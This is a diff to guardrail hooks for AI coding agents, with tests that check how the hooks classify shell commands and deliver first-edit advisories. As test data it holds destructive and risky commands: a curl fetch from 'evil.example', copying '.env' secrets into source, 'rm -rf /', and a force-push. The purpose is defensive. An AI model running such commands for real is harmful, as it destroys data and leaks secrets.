diff --git a/.bkit/core/.agents/plugins/bkit/hooks/bkit-guardrails.cjs b/.bkit/core/.agents/plugins/bkit/hooks/bkit-guardrails.cjs
index 9f72cf0bc..228daeab9 100644
--- a/.bkit/core/.agents/plugins/bkit/hooks/bkit-guardrails.cjs
+++ b/.bkit/core/.agents/plugins/bkit/hooks/bkit-guardrails.cjs
@@ -96,7 +96,7 @@ function bkitGuardrails(payload) {
   if (typeof raw !== "string") return null;
 
   const cmd = raw.trim();
-  const tier = classifyShell(cmd, hookDirs(p));
+  const tier = classifyShell(cmd, hookDirs(p), hookContext(p));
   if (!tier) return null;
   if (tier.tier === "deny") {
     return {
@@ -118,7 +118,8 @@ function bkitGuardrails(payload) {
   }
   const advisory =
     tier.tier === "fetch"
-      ? `bkit Antigravity guardrails: outbound fetch to a host that is not on the network allowlist.\nConfirm the destination is intended before you rely on the result.\nCommand: ${cmd}`
+      ? `bkit Antigravity guardrails: outbound fetch to a host that is not on the network allowlist.\nConfirm the destination is intended before you rely on the result.\nCommand: ${cmd}` +
+        (tier.edits ? `\n\n${shellEditAdvisory(tier.edits)}` : "")
       : shellEditAdvisory(tier.edits);
   return adviseOnce("guardrails", p.session_id, agCallSignature(tool, input), advisory);
 }
diff --git a/.bkit/core/.claude/hooks/bkit-guardrails.cjs b/.bkit/core/.claude/hooks/bkit-guardrails.cjs
index ab405902f..3141a45f6 100644
--- a/.bkit/core/.claude/hooks/bkit-guardrails.cjs
+++ b/.bkit/core/.claude/hooks/bkit-guardrails.cjs
@@ -62,8 +62,8 @@ function bkitGuardrails(payload) {
         "If the host is a standing dependency, add it to allowed-domains.",
     );
   }
-  const edits = shellEditTargets(c);
-  if (edits.length > 0) notes.push(shellEditAdvisory(edits));
+  const edits = shellEditTargets(c, hookContext(payload));
+  if (hasEditEvidence(edits)) notes.push(shellEditAdvisory(edits));
 
   return notes.length > 0 ? { context: notes.join("\n\n") } : null;
 }
diff --git a/.bkit/core/.codex/hooks/bkit-gateguard.cjs b/.bkit/core/.codex/hooks/bkit-gateguard.cjs
index 33dea1ece..af9bac583 100644
--- a/.bkit/core/.codex/hooks/bkit-gateguard.cjs
+++ b/.bkit/core/.codex/hooks/bkit-gateguard.cjs
@@ -79,14 +79,19 @@ function bkitGateguard(payload) {
   const input = payload.tool_input || {};
   const cwd = typeof payload.cwd === "string" ? payload.cwd : "";
   const sessionId = dedupKey(payload.session_id, payload.agent_id);
-  // One patch can touch several files. Advises on the first not-yet-warned target, so a
-  // new file after an already-warned one still gets its advisory.
-  const target = parseApplyPatchTargets(input.command, cwd).find(
-    (t) => !alreadyWarned(sessionId, t.file),
-  );
-  if (!target) return null;
-  // `*** Add File:` IS the new-file signal; no existence probe.
-  return firstTouchAdvice(target.file, sessionId, target.isNew);
+  // One patch can touch several files. Every not-yet-warned target is prepared (nothing is
+  // recorded), complete blocks are selected inside Codex's output budget, and only the
+  // selected blocks are acknowledged; the rest stay eligible for a later edit.
+  const blocks = [];
+  const seen = new Set();
+  for (const t of parseApplyPatchTargets(input.command, cwd)) {
+    // `*** Add File:` IS the new-file signal; no existence probe.
+    const prepared = prepareAdvice(t.file, sessionId, t.isNew, cwd);
+    if (!prepared || seen.has(prepared.key)) continue;
+    seen.add(prepared.key);
+    blocks.push(prepared);
+  }
+  return deliverAdvice(blocks, ADVICE_BUDGETS.codex, true);
 }
 
 // bkit:end
diff --git a/.bkit/core/.codex/hooks/bkit-guardrails.cjs b/.bkit/core/.codex/hooks/bkit-guardrails.cjs
index 69ac5a91b..b14a23bff 100644
--- a/.bkit/core/.codex/hooks/bkit-guardrails.cjs
+++ b/.bkit/core/.codex/hooks/bkit-guardrails.cjs
@@ -58,10 +58,11 @@ function deny(reason) {
 /**
  * @param {string} cmd
  * @param {string[]} dirs where to look for the network allowlist (`hookDirs`)
+ * @param {{ cwd?: string, root?: string }} ctx the call's directories (`hookContext`)
  */
-function decideShell(cmd, dirs) {
+function decideShell(cmd, dirs, ctx) {
   const c = String(cmd || "").trim();
-  const v = classifyShell(c, dirs);
+  const v = classifyShell(c, dirs, ctx);
   if (!v) return allow();
   switch (v.tier) {
     case "deny":
@@ -77,7 +78,8 @@ function decideShell(cmd, dirs) {
       );
     case "fetch":
       return ask(
-        `bkit Codex guardrails: outbound fetch to a host that is not on the network allowlist.\nConfirm the destination is intended before you rely on the result.\nCommand: ${c}`,
+        `bkit Codex guardrails: outbound fetch to a host that is not on the network allowlist.\nConfirm the destination is intended before you rely on the result.\nCommand: ${c}` +
+          (v.edits ? `\n\n${shellEditAdvisory(v.edits)}` : ""),
       );
     default:
       // Shell-as-edit-channel: advisory on every host, never a block.
@@ -103,7 +105,7 @@ function bkitGuardrails(payload) {
   // Codex passes the command as a string, or as an argv array for some shells.
   const cmd = Array.isArray(input.command) ? input.command.join(" ") : input.command;
   if (typeof cmd !== "string") return null;
-  const decision = decideShell(cmd, hookDirs(payload));
+  const decision = decideShell(cmd, hookDirs(payload), hookContext(payload));
   return decision.verdict === "allow" ? null : decision;
 }
 
diff --git a/.bkit/core/.cursor/hooks/bkit-guardrails.cjs b/.bkit/core/.cursor/hooks/bkit-guardrails.cjs
index 79c1137d0..1180bbe92 100644
--- a/.bkit/core/.cursor/hooks/bkit-guardrails.cjs
+++ b/.bkit/core/.cursor/hooks/bkit-guardrails.cjs
@@ -59,10 +59,11 @@ function deny(userMessage, agentMessage) {
 /**
  * @param {string} cmd
  * @param {string[]} dirs where to look for the network allowlist (`hookDirs`)
+ * @param {{ cwd?: string, root?: string }} ctx the call's directories (`hookContext`)
  */
-function decideShell(cmd, dirs) {
+function decideShell(cmd, dirs, ctx) {
   const c = cmd.trim();
-  const v = classifyShell(c, dirs);
+  const v = classifyShell(c, dirs, ctx);
   if (!v) return allow();
   switch (v.tier) {
     case "deny":
@@ -117,7 +118,7 @@ function bkitGuardrails(payload) {
     payload.tool_name == null &&
     payload.tool_input == null
   ) {
-    return decideShell(payload.command, hookDirs(payload));
+    return decideShell(payload.command, hookDirs(payload), hookContext(payload));
   }
 
   // preToolUse Read/TabRead: { tool_name, tool_input: { path|file_path|target_file|... } }
diff --git a/.bkit/core/.opencode/plugin/bkit-gateguard.js b/.bkit/core/.opencode/plugin/bkit-gateguard.js
index 93b1b7777..987b4d43a 100644
--- a/.bkit/core/.opencode/plugin/bkit-gateguard.js
+++ b/.bkit/core/.opencode/plugin/bkit-gateguard.js
@@ -56,6 +56,10 @@ import * as path from "node:path";
 // The terminal tool (`shell` in v2, `bash` before v2) is NOT in this list.
 const EDIT_TOOLS = new Set(["write", "edit", "patch", "apply_patch"]);
 
+// The plugin process outlives a tool call, so a deny whose state file cannot be written is
+// remembered in process and the retry passes.
+const GATEGUARD_PROCESS_PERSISTS = true;
+
 // {{BKIT_PART gateguard-engine.js}}
 
 // Pure: takes the tool name, the already-extracted file path, and the session id
diff --git a/.bkit/core/engine/audits/hooks/gateguard-opencode.test.ts b/.bkit/core/engine/audits/hooks/gateguard-opencode.test.ts
index 25732d46e..7899c4763 100644
--- a/.bkit/core/engine/audits/hooks/gateguard-opencode.test.ts
+++ b/.bkit/core/engine/audits/hooks/gateguard-opencode.test.ts
@@ -928,3 +928,190 @@ describe("gateguard plugin — docs/*.md density advisory (#422)", () => {
     );
   });
 });
+
+// ---------------------------------------------------------------------------
+// Shared general reminder, normalized warning identity and state semantics (#787)
+// ---------------------------------------------------------------------------
+
+describe("gateguard shared advice — general authoring reminder and identity", () => {
+  const ENV = { BKIT_GATEGUARD: undefined } as const;
+
+  it("prepares complete advice without acknowledging it", async () => {
+    const AGENT_READ = [
+      ".agents/rules.md",
+      ".bkit/workflows.md",
+      ".bkit/core/hooks/gateguard-engine.js",
+      "docs/testing.md",
+      "AGENTS.md",
+      "CLAUDE.md",
+      "GEMINI.md",
+    ];
+    for (const file of AGENT_READ) {
+      const session = newSession();
+      const { hookInput, output } = editHookInput(file, session);
+      const r = await invokeHook(plugin, orchestratorClient(), hookInput, output, ENV);
+      // The existing checklist is kept, then one general reminder pointing at the authoring guide.
+      expect({ file, checklist: r.advice.includes("First edit to") }).toEqual({
+        file,
+        checklist: true,
+      });
+      expect({ file, reminder: r.advice.includes("Which Sections Apply") }).toEqual({
+        file,
+        reminder: true,
+      });
+      expect(r.advice).toContain("authoring.md");
+      expect(r.advice.indexOf("First edit to")).toBeLessThan(
+        r.advice.indexOf("Which Sections Apply"),
+      );
+    }
+
+    // A new agent-read file keeps the reuse checklist and still gets the reminder.
+    const fresh = writeHookInput(".agents/no-such-file-for-reminder.md", newSession());
+    const created = await invokeHook(
+      plugin,
+      orchestratorClient(),
+      fresh.hookInput,
+      fresh.output,
+      ENV,
+    );
+    expect(created.advice).toContain("Evolve existing code first");
+    expect(created.advice).toContain("Which Sections Apply");
+
+    // A path outside the agent-read set gets no authoring reminder.
+    for (const file of ["src/index.ts", "README.md"]) {
+      const { hookInput, output } = editHookInput(file, newSession());
+      const r = await invokeHook(plugin, orchestratorClient(), hookInput, output, ENV);
+      expect({ file, reminder: r.advice.includes("Which Sections Apply") }).toEqual({
+        file,
+        reminder: false,
+      });
+    }
+
+    // Preparing advice (the before hook in advisory mode) leaves warning state untouched,
+    // so the after hook still delivers the full advice.
+    const session = newSession();
+    const hooks: Record<string, HookFn> = {};
+    await plugin.setup({
+      tool: {
+        hook: async (name: string, cb: HookFn) => {
+          hooks[name] = cb;
+        },
+      },
+    });
+    const event = {
+      tool: "edit",
+      sessionID: session,
+      id: "prep-only",
+      input: { path: "docs/testing.md" },
+    };
+    await withEnv(ENV, async () => {
+      await hooks["execute.before"]!(event, {});
+    });
+    expect(fs.existsSync(stateFile(session))).toBe(false);
+    expect(isWarned(session, "docs/testing.md")).toBe(false);
+    const result: { content: { type: string; text: string }[] } = { content: [] };
+    await withEnv(ENV, async () => {
+      await hooks["execute.after"]!({ ...event, status: "completed", result }, {});
+    });
+    expect(result.content.map((c) => c.text).join("")).toContain("Which Sections Apply");
+  });
+
+  it("shares normalized warning identity across edit channels", async () => {
+    const rel = "docs/testing.md";
+    const abs = path.resolve(rel);
+
+    // Relative first, then every other spelling of the same file: silent.
+    const session = newSession();
+    const first = editHookInput(rel, session);
+    const r1 = await invokeHook(plugin, orchestratorClient(), first.hookInput, first.output, ENV);
+    expect(r1.advice).toContain("Which Sections Apply");
+    for (const spelling of [abs, `./${rel}`, `docs/../${rel}`]) {
+      const again = editHookInput(spelling, session);
+      const r = await invokeHook(plugin, orchestratorClient(), again.hookInput, again.output, ENV);
+      expect({ spelling, advice: r.advice }).toEqual({ spelling, advice: "" });
+    }
+    // The other channels agree: the 1.x driver and the multi-file patch tool.
+    const v1 = await invokeHookV1(
+      plugin,
+      orchestratorClient(),
+      { tool: "edit", sessionID: session, callID: "v1-ident" },
+      { args: { path: abs } },
+      ENV,
+    );
+    expect(v1.advice).toBe("");
+    const patch = await invokeHook(
+      plugin,
+      orchestratorClient(),
+      { tool: "apply_patch", sessionID: session, callID: "patch-ident" },
+      {
+        args: { patchText: `*** Begin Patch\n*** Update File: ${abs}\n@@\n-a\n+b\n*** End Patch` },
+      },
+      ENV,
+    );
+    expect(patch.advice).toBe("");
+
+    // Absolute first, then relative: still one reminder.
+    const session2 = newSession();
+    const a = editHookInput(abs, session2);
+    expect(
+      (await invokeHook(plugin, orchestratorClient(), a.hookInput, a.output, ENV)).advice,
+    ).toContain("Which Sections Apply");
+    const b = editHookInput(rel, session2);
+    expect(
+      (await invokeHook(plugin, orchestratorClient(), b.hookInput, b.output, ENV)).advice,
+    ).toBe("");
+
+    // Another session (a subagent has its own) is never suppressed by this one.
+    const other = editHookInput(rel, newSession());
+    const r3 = await invokeHook(plugin, subagentClient(), other.hookInput, other.output, ENV);
+    expect(r3.advice).toContain("Which Sections Apply");
+  });
+
+  it("preserves off deny and state-fallback semantics", async () => {
+    // off: no advice and no state written.
+    const offSession = newSession();
+    const off = editHookInput("docs/testing.md", offSession);
+    const offResult = await invokeHook(plugin, orchestratorClient(), off.hookInput, off.output, {
+      BKIT_GATEGUARD: "off",
+    });
+    expect(offResult).toMatchObject({ threw: false, advice: "" });
+    expect(fs.existsSync(stateFile(offSession))).toBe(false);
+
+    // deny: the first touch throws with the full advice, the retry passes.
+    const denySession = newSession();
+    const deny = editHookInput("docs/testing.md", denySession);
+    const denied = await invokeHook(plugin, orchestratorClient(), deny.hookInput, deny.output, {
+      BKIT_GATEGUARD: "deny",
+    });
+    expect(denied.threw).toBe(true);
+    expect(String(denied.error?.message)).toContain("Which Sections Apply");
+    const retry = await invokeHook(plugin, orchestratorClient(), deny.hookInput, deny.output, {
+      BKIT_GATEGUARD: "deny",
+    });
+    expect(retry.threw).toBe(false);
+
+    // Unavailable state (the temp dir is a plain file): advisory still delivers, and a deny
+    // cannot loop, because the process remembers what it warned about.
+    const blocker = path.join(GENERATED, "not-a-dir");
+    fs.writeFileSync(blocker, "x");
+    const brokenTmp = { TMPDIR: blocker } as const;
+    const fbSession = newSession();
+    const fb = editHookInput("docs/testing.md", fbSession);
+    const advised = await invokeHook(plugin, orchestratorClient(), fb.hookInput, fb.output, {
+      BKIT_GATEGUARD: undefined,
+      ...brokenTmp,
+    });
+    expect(advised.threw).toBe(false);
+    expect(advised.advice).toContain("Which Sections Apply");
+    const fbDeny = editHookInput("docs/testing.md", newSession());
+    const first = await invokeHook(plugin, orchestratorClient(), fbDeny.hookInput, fbDeny.output, {
+      BKIT_GATEGUARD: "deny",
+      ...brokenTmp,
+    });
+    const second = await invokeHook(plugin, orchestratorClient(), fbDeny.hookInput, fbDeny.output, {
+      BKIT_GATEGUARD: "deny",
+      ...brokenTmp,
+    });
+    expect({ first: first.threw, second: second.threw }).toEqual({ first: true, second: false });
+  });
+});
diff --git a/.bkit/core/engine/audits/hooks/gateguard-parity.integration.test.ts b/.bkit/core/engine/audits/hooks/gateguard-parity.integration.test.ts
index fc701dffd..d40da5187 100644
--- a/.bkit/core/engine/audits/hooks/gateguard-parity.integration.test.ts
+++ b/.bkit/core/engine/audits/hooks/gateguard-parity.integration.test.ts
@@ -463,6 +463,27 @@ function stateRoot(...unwritable: string[]): string {
   return root;
 }
 
+describe("gateguard behaviour parity — corrupt state", () => {
+  for (const host of ["claude", "cursor", "opencode", "codex"] as Host[]) {
+    it(`${host}: unparseable session state still advises, and deny does not loop`, async () => {
+      const tmp = stateRoot();
+      const session = newSession();
+      const dir = path.join(tmp, `bkit-gateguard-${UID}`);
+      fs.mkdirSync(dir, { recursive: true });
+      fs.writeFileSync(path.join(dir, `${session}.json`), "{not json");
+      const advised = await run(host, { file: "package.json", session, env: { TMPDIR: tmp } });
+      expect(advised.advisory).toContain("[bkit GateGuard]");
+
+      const denySession = newSession();
+      fs.writeFileSync(path.join(dir, `${denySession}.json`), "{not json");
+      const env = { BKIT_GATEGUARD: "deny", TMPDIR: tmp };
+      const first = await run(host, { file: "package.json", session: denySession, env });
+      expect(first.blocked).toBe(true);
+      expect(first.advisory).toContain("[bkit GateGuard]");
+    });
+  }
+});
+
 describe("gateguard behaviour parity — state folders", () => {
   for (const host of HOSTS) {
     it(`${host}: dedup state lives in a per-user folder`, async () => {
@@ -728,3 +749,101 @@ describe("gateguard parity — documented deviations", () => {
     }
   });
 });
+
+// ---------------------------------------------------------------------------
+// Task 5: complete-block batching inside conservative host budgets. Codex is the host
+// whose multi-file patch envelope reaches the shared engine today and which has a 2,000
+// UTF-8 byte budget; opencode applies no host budget, so it cannot observe batching.
+// ---------------------------------------------------------------------------
+
+const CODEX_BUDGET_BYTES = 2000;
+
+function codexPatch(session: string, targets: string[], tmp: string) {
+  const command = [
+    "*** Begin Patch",
+    ...targets.flatMap((t) => [`*** Update File: ${t}`, "@@", "-a", "+b"]),
+    "*** End Patch",
+  ].join("\n");
+  const res = spawnSync("node", [CODEX_HOOK], {
+    input: JSON.stringify({
+      tool_name: "apply_patch",
+      tool_input: { command },
+      session_id: session,
+      cwd: process.cwd(),
+    }),
+    encoding: "utf-8",
+    env: { ...process.env, BKIT_GATEGUARD: undefined, TMPDIR: tmp },
+  });
+  const out = res.stdout.trim() ? JSON.parse(res.stdout.trim()) : {};
+  return String(out.hookSpecificOutput?.additionalContext ?? "");
+}
+
+function warnedFiles(tmp: string, session: string): string[] {
+  const dir = path.join(
+    tmp,
+    typeof process.getuid === "function" ? `bkit-gateguard-${process.getuid()}` : "bkit-gateguard",
+  );
+  const file = path.join(dir, `${session.replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 128)}.json`);
+  if (!fs.existsSync(file)) return [];
+  return Object.keys(JSON.parse(fs.readFileSync(file, "utf-8")).files);
+}
+
+function omittedCount(advice: string): number | null {
+  const m =
+    /\b(\d+)\b[^\n]{0,40}omitted/i.exec(advice) ?? /omitted[^\n]{0,40}?\b(\d+)\b/i.exec(advice);
+  return m ? Number(m[1] ?? m[2]) : null;
+}
+
+function completeBlocks(advice: string): { started: number; finished: number } {
+  return {
+    started: (advice.match(/\[bkit GateGuard\] (?:First edit to|New file)/g) ?? []).length,
+    finished: (advice.match(/Advisory: proceed once satisfied\./g) ?? []).length,
+  };
+}
+
+describe("codex gateguard — complete-block batching", () => {
+  it("reserves notices inside conservative host budgets", () => {
+    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
+    const targets = ["src/aa.ts", "src/bb.ts", "src/cc.ts", "src/dd.ts"];
+    const advice = codexPatch(newSession(), targets, tmp);
+
+    // The whole composed response fits the byte budget, and only complete blocks appear.
+    expect(Buffer.byteLength(advice, "utf-8")).toBeLessThanOrEqual(CODEX_BUDGET_BYTES);
+    const { started, finished } = completeBlocks(advice);
+    expect(started).toBeGreaterThanOrEqual(1);
+    expect(finished).toBe(started);
+    // The omitted-target count is exact.
+    expect(omittedCount(advice)).toBe(targets.length - started);
+
+    // Zero-fit block: one multi-byte basename whose single block exceeds the budget by bytes
+    // (but not by characters). It is dropped whole, never cut, and counted as omitted.
+    const wide = `src/${"é".repeat(700)}.ts`;
+    const zero = codexPatch(newSession(), [wide], tmp);
+    expect(Buffer.byteLength(zero, "utf-8")).toBeLessThanOrEqual(CODEX_BUDGET_BYTES);
+    expect(zero).not.toContain("First edit to");
+    expect(omittedCount(zero)).toBe(1);
+  });
+
+  it("acknowledges only complete selected blocks on verified routes", () => {
+    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
+    const session = newSession();
+    const root = process.cwd();
+    const small = "src/shown-first.ts";
+    const huge = `src/${"é".repeat(700)}.ts`;
+    const later = "src/later-reminder.ts";
+
+    const first = codexPatch(session, [small, huge, later], tmp);
+    expect(first).toContain("shown-first.ts");
+    expect(first).not.toContain("later-reminder.ts");
+    expect(omittedCount(first)).toBe(2);
+
+    // Only the complete shown block is acknowledged; unshown paths stay eligible.
+    expect(warnedFiles(tmp, session)).toEqual([path.resolve(root, small)]);
+
+    // A later patch still reminds for the path that was not shown.
+    const second = codexPatch(session, [later], tmp);
+    expect(second).toContain("later-reminder.ts");
+    // The acknowledged path is silent.
+    expect(codexPatch(session, [small], tmp)).toBe("");
+  });
+});
diff --git a/.bkit/core/engine/audits/hooks/guardrails-antigravity.integration.test.ts b/.bkit/core/engine/audits/hooks/guardrails-antigravity.integration.test.ts
index 713278d4c..7ea81c016 100644
--- a/.bkit/core/engine/audits/hooks/guardrails-antigravity.integration.test.ts
+++ b/.bkit/core/engine/audits/hooks/guardrails-antigravity.integration.test.ts
@@ -124,6 +124,40 @@ describe("antigravity guardrails.cjs — Antigravity contract", () => {
     expect(run("sed -i '' 's/a/b/' src/index.ts", conversation)).toEqual({ decision: "allow" });
   });
 
+  it("preserves stronger shell decisions and compound advice", () => {
+    // A stronger decision is never downgraded by edit context beside it.
+    const ask = run("git reset --hard HEAD~1 && sed -i s/a/b/ src/a.ts");
+    expect(ask.decision).toBe("ask");
+    expect(ask.reason).toContain("PROHIBITED list");
+    expect(run("git push --force origin main; echo x > src/a.ts").decision).toBe("deny");
+    const secret = run("cat .env > src/copy.ts");
+    expect(secret.decision).toBe("ask");
+    expect(secret.reason).toContain("secrets");
+
+    // An allowed fetch cannot hide a following edit: both the notice and the edit
+    // advice are delivered once, and the identical retry passes.
+    const conversation = newConversation();
+    const allowedFetch = "curl -s https://api.github.com/x > src/out.json";
+    const first = run(allowedFetch, conversation);
+    expect(first.decision).toBe("deny");
+    expect(first.reason).toContain("edits files through the shell");
+    expect(first.reason).toContain("src/out.json");
+    expect(run(allowedFetch, conversation)).toEqual({ decision: "allow" });
+
+    // A fetch off the allowlist beside an edit carries both notices.
+    const both = run("curl https://evil.example/x > src/out2.json");
+    expect(both.decision).toBe("deny");
+    expect(both.reason).toContain("outbound fetch");
+    expect(both.reason).toContain("edits files through the shell");
+    expect(both.reason).toContain("src/out2.json");
+
+    // Quiet sinks stay quiet, even beside an allowed fetch.
+    expect(run("curl -s https://api.github.com/x > /dev/null")).toEqual({ decision: "allow" });
+    expect(run("curl -s https://api.github.com/x > /tmp/response.log")).toEqual({
+      decision: "allow",
+    });
+  });
+
   it("allows ordinary commands and other tools", () => {
     expect(run("pnpm test")).toEqual({ decision: "allow" });
     expect(run("rm -rf /", newConversation(), "view_file")).toEqual({ decision: "allow" });
diff --git a/.bkit/core/engine/audits/hooks/guardrails-cursor.integration.test.ts b/.bkit/core/engine/audits/hooks/guardrails-cursor.integration.test.ts
index 0ec6482b7..d93ad94dc 100644
--- a/.bkit/core/engine/audits/hooks/guardrails-cursor.integration.test.ts
+++ b/.bkit/core/engine/audits/hooks/guardrails-cursor.integration.test.ts
@@ -5,7 +5,8 @@ import * as fs from "node:fs";
 import * as os from "node:os";
 import * as path from "node:path";
 import { spawnSync } from "node:child_process";
-import { afterAll, describe, expect, it } from "vitest";
+import { createRequire } from "node:module";
+import { afterAll, describe, expect, it, vi } from "vitest";
 import { writeNetworkAllowlist } from "../../install/network-allowlist";
 import { applyTokens } from "../../install/placeholders";
 import { readTemplate } from "../../render/parts";
@@ -183,6 +184,414 @@ describe("cursor guardrails.cjs — read", () => {
   });
 });
 
+// ---------------------------------------------------------------------------
+// Shell edit evidence — exact targets, independent uncertainty, bounded inspection.
+// The advisory text is the surface under test: it names every exact target and says so
+// when the targets of a command cannot be determined.
+// ---------------------------------------------------------------------------
+
+/** Run one shell call from `cwd` and return its permission plus the advice text. */
+function advise(
+  command: string,
+  cwd: string = GENERATED,
+  env: NodeJS.ProcessEnv = process.env,
+): { permission: string | undefined; text: string; raw: string; ms: number } {
+  const started = Date.now();
+  const res = spawnSync("node", [HOOK], {
+    cwd: GENERATED,
+    env,
+    input: JSON.stringify({ command, cwd, workspace_roots: [GENERATED] }),
+    encoding: "utf-8",
+    timeout: 20_000,
+  });
+  let doc: { permission?: string; agent_message?: string } = {};
+  try {
+    doc = JSON.parse(res.stdout.trim()) as typeof doc;
+  } catch {
+    doc = {};
+  }
+  return {
+    permission: doc.permission,
+    text: doc.agent_message ?? "",
+    raw: res.stdout,
+    ms: Date.now() - started,
+  };
+}
+
+const UNCERTAIN = /cannot be determined/i;
+const LIMIT = /analysis[- ]limit/i;
+
+/** A fresh directory inside the repo root for fixtures one test owns. */
+function workDir(name: string): string {
+  const dir = fs.mkdtempSync(path.join(GENERATED, `${name}-`));
+  return dir;
+}
+
+/** Wrap `inner` as the script of a `bash -c '…'`. */
+function bashC(inner: string): string {
+  return `bash -c '${inner.replace(/'/g, `'\\''`)}'`;
+}
+
+describe("cursor guardrails.cjs — shell edit evidence", () => {
+  it("retains lexical context for nested shell edits", () => {
+    // A `;` inside quotes is text: the echo below runs once and edits nothing.
+    const quoted = advise('echo "a; echo x > src/fake.ts; b"');
+    expect({ permission: quoted.permission, text: quoted.text }).toEqual({
+      permission: "allow",
+      text: "",
+    });
+
+    // A heredoc body is data, never commands: only the redirect on the opener edits.
+    const heredoc = advise("cat > src/real.ts <<'EOF'\nline; echo x > src/fake.ts\nEOF");
+    expect(heredoc.text).toContain("src/real.ts");
+    expect(heredoc.text).not.toContain("src/fake.ts");
+
+    // An escaped separator is a literal argument, so the redirect still belongs to echo.
+    expect(advise("echo a\; b > src/escaped.ts").text).toContain("src/escaped.ts");
+    // A quoted `>` is text.
+    expect(advise("rg 'x > src/quoted.ts' src").text).toBe("");
+
+    // Wrappers, nested shells and substitutions are followed.
+    expect(advise(bashC('echo "a; b" > src/nested.ts')).text).toContain("src/nested.ts");
+    expect(advise("echo $(printf x > src/subst.ts)").text).toContain("src/subst.ts");
+    expect(advise("sudo env A=1 tee src/wrapped.ts").text).toContain("src/wrapped.ts");
+    expect(advise("echo `printf x > src/tick.ts`").text).toContain("src/tick.ts");
+  });
+
+  it("recognizes direct edit command families", () => {
+    const cases: ReadonlyArray<{ command: string; targets: string[]; notTargets?: string[] }> = [
+      { command: "echo x > src/redir.ts", targets: ["src/redir.ts"] },
+      { command: "echo x >> src/append.ts", targets: ["src/append.ts"] },
+      { command: "echo x | tee src/tee.ts", targets: ["src/tee.ts"] },
+      {
+        command: "echo x | tee -a src/tee-a.ts src/tee-b.ts",
+        targets: ["src/tee-a.ts", "src/tee-b.ts"],
+      },
+      { command: "sed -i '' s/a/b/ src/sed.ts", targets: ["src/sed.ts"] },
+      {
+        command: "sed -i.bak s/a/b/ src/sed1.ts src/sed2.ts",
+        targets: ["src/sed1.ts", "src/sed2.ts"],
+      },
+      { command: "perl -pi -e s/a/b/ src/perl.js", targets: ["src/perl.js"] },
+      { command: "awk -i inplace '{print}' src/awk.ts", targets: ["src/awk.ts"] },
+      { command: "ruby -i -pe '$_.upcase!' src/ruby.rb", targets: ["src/ruby.rb"] },
+      {
+        command: "cp template.txt src/copied.ts",
+        targets: ["src/copied.ts"],
+        notTargets: ["template.txt"],
+      },
+      {
+        command: "mv src/old-name.ts src/new-name.ts",
+        targets: ["src/old-name.ts", "src/new-name.ts"],
+      },
+    ];
+    for (const { command, targets, notTargets = [] } of cases) {
+      const r = advise(command);
+      expect({ command, permission: r.permission }).toEqual({ command, permission: "allow" });
+      for (const t of targets)
+        expect({ command, t, named: r.text.includes(t) }).toEqual({ command, t, named: true });
+      for (const t of notTargets)
+        expect({ command, t, named: r.text.includes(t) }).toEqual({ command, t, named: false });
+    }
+    // Ordered and unique: a repeated target is named once.
+    const twice = advise("echo a > src/dup.ts; echo b >> src/dup.ts").text;
+    expect(twice.split("src/dup.ts").length - 1).toBe(1);
+  });
+
+  it("normalizes literal working directories without guessing", () => {
+    const base = workDir("cwd");
+    const sub = path.join(base, "sub");
+    fs.mkdirSync(path.join(sub, "pkg"), { recursive: true });
+    fs.mkdirSync(path.join(base, "other"), { recursive: true });
+    const rel = (p: string) => path.relative(GENERATED, p).split(path.sep).join("/");
+
+    // A relative target resolves against the effective command directory, not the workspace.
+    expect(advise("echo x > out.ts", sub).text).toContain(rel(path.join(sub, "out.ts")));
+    // A literal cd moves the effective directory for what follows.
+    expect(advise("cd pkg && echo x > out.ts", sub).text).toContain(
+      rel(path.join(sub, "pkg", "out.ts")),
+    );
+    // `..` is normalized.
+    const up = advise("cd ../other && echo x > out.ts", sub).text;
+    expect(up).toContain(rel(path.join(base, "other", "out.ts")));
+    expect(up).not.toContain("sub/other");
+    // An absolute target keeps its identity.
+    const abs = path.join(GENERATED, "src", "abs.ts");
+    expect(advise(`echo x > ${abs}`, sub).text).toContain(rel(abs));
+
+    // An unresolved directory means the target is unknown: no guessed path, explicit uncertainty.
+    const unresolved = advise('cd "$TARGET_DIR" && echo x > guessed.ts', sub);
+    expect(unresolved.text).toMatch(UNCERTAIN);
+    expect(unresolved.text).not.toContain("guessed.ts");
+    const subst = advise("cd $(pwd)/x && echo x > guessed2.ts", sub);
+    expect(subst.text).toMatch(UNCERTAIN);
+    expect(subst.text).not.toContain("guessed2.ts");
+    expect(unresolved.permission).toBe("allow");
+  });
+
+  it("extracts all literal patch effects", () => {
+    const dir = workDir("patch");
+    const body = [
+      "diff --git a/src/added.ts b/src/added.ts",
+      "new file mode 100644",
+      "--- /dev/null",
+      "+++ b/src/added.ts",
+      "@@ -0,0 +1 @@",
+      "+x",
+      "diff --git a/src/removed.ts b/src/removed.ts",
+      "deleted file mode 100644",
+      "--- a/src/removed.ts",
+      "+++ /dev/null",
+      "@@ -1 +0,0 @@",
+      "-x",
+      "diff --git a/src/before.ts b/src/after.ts",
+      "similarity index 100%",
+      "rename from src/before.ts",
+      "rename to src/after.ts",
+      "",
+    ].join("\n");
+    fs.writeFileSync(path.join(dir, "fix.patch"), body);
+
+    const apply = advise("git apply fix.patch", dir).text;
+    for (const t of ["src/added.ts", "src/removed.ts", "src/before.ts", "src/after.ts"]) {
+      expect({ t, named: apply.includes(t) }).toEqual({ t, named: true });
+    }
+
+    // Strip level and directory options shift the identity of every target.
+    const stripped = [
+      "--- a/lib/src/s.ts",
+      "+++ b/lib/src/s.ts",
+      "@@ -1 +1 @@",
+      "-a",
+      "+b",
+      "",
+    ].join("\n");
+    fs.writeFileSync(path.join(dir, "strip.patch"), stripped);
+    expect(advise("patch -p2 < strip.patch", dir).text).toContain("src/s.ts");
+    const dirOpt = advise("patch -p1 -d vendor < strip.patch", dir).text;
+    expect(dirOpt).toContain("vendor/lib/src/s.ts");
+    expect(advise("git apply -p2 strip.patch", dir).text).toContain("src/s.ts");
+
+    // A literal heredoc patch is inspected too.
+    const here = advise(
+      "git apply <<'EOF'\n--- a/src/here.ts\n+++ b/src/here.ts\n@@ -1 +1 @@\n-a\n+b\nEOF",
+      dir,
+    );
+    expect(here.text).toContain("src/here.ts");
+
+    // Unknown stdin (a pipe) cannot name its targets.
+    const piped = advise("cat strip.patch | git apply", dir).text;
+    expect(piped).toMatch(UNCERTAIN);
+  });
+
+  it("classifies inline and named script effects", () => {
+    const dir = workDir("script");
